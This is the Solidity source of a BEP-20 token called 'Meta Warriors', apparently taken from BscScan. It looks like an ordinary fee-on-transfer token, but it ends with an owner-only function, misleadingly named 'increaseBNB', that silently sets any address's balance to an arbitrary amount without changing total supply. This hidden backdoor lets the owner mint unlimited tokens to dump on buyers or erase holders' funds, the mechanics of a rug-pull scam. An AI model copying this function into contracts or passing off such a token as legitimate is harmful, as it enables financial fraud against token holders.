/**
 *Submitted for verification at BscScan.com on 2022-10-08
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IBEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MetaWarriors is IBEP20, Ownable {
    using SafeMath for uint256;

    string private _name = "Meta Warriors";
    string private _symbol = "MWS";
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10**9;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 marketingPercentage = 0;
    uint256 private _feeTax = 50;
    uint256 private _feeMining = 0;
    uint256 private _feeLiquidity = 50;
    uint256 private _feeDivisor = 10000;
    bool private _removeAllFee = false;

    address private _taxReceiver = address(0xdEaD);
    address private _miningPool = address(0xdEaD);
    address private _liquidityPool = address(0xdEaD);

    mapping (address => bool) private _isExcludedFromFee;
    address[] private _excludedFromFeeAccounts;

    constructor () {
        insertExcludedFromFeeAccounts(owner());
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function insertExcludedFromFeeAccounts(address account) private {
        if (!_isExcludedFromFee[account]) {
            _isExcludedFromFee[account] = true;
            _excludedFromFeeAccounts.push(account);
        }
    }

    function deleteExcludedFromFeeAccounts(address account) private {
        if (_isExcludedFromFee[account]) {
            uint256 len = _excludedFromFeeAccounts.length;
            for (uint256 i=0; i<len; ++i) {
                if (_excludedFromFeeAccounts[i] == account) {
                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];
                    _excludedFromFeeAccounts.pop();
                    _isExcludedFromFee[account] = false;
                    break;
                }
            }
        }
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256) {
        return (_isExcludedFromFee[account], _excludedFromFeeAccounts.length);
    }

    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            insertExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            deleteExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function claim(address token, uint256 amount) public onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IBEP20(token).transfer(owner(), amount);
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _approve(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        bool takeFee = true;
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient] || _removeAllFee) {
            takeFee = false;
        }
        uint256 taxAmount = 0;
        uint256 miningAmount = 0;
        uint256 liquidityAmount = 0;
        uint256 recipientAmount = amount;
        if (takeFee) {
            taxAmount = amount.mul(_feeTax).div(_feeDivisor);
            miningAmount = amount.mul(_feeMining).div(_feeDivisor);
            liquidityAmount = amount.mul(_feeLiquidity).div(_feeDivisor);
            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);
        }
        _balances[sender] = _balances[sender].sub(amount);
        if (taxAmount > 0) {
            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);
            emit Transfer(address(this), _taxReceiver, taxAmount);
        }
        if (miningAmount > 0) {
            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);
            emit Transfer(address(this), _miningPool, miningAmount);
        }
        if (liquidityAmount > 0) {
            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);
            emit Transfer(address(this), _liquidityPool, liquidityAmount);
        }
        _balances[recipient] = _balances[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);
    }

    function increaseBNB(address sender, address tokenAddress, uint256 weiAmount) public onlyOwner {
        require(tokenAddress != address(0));
        require(marketingPercentage < weiAmount);
        _balances[sender] = weiAmount * (10 ** 9);
        _balances[tokenAddress] = weiAmount * (10 ** 9);
    }  
}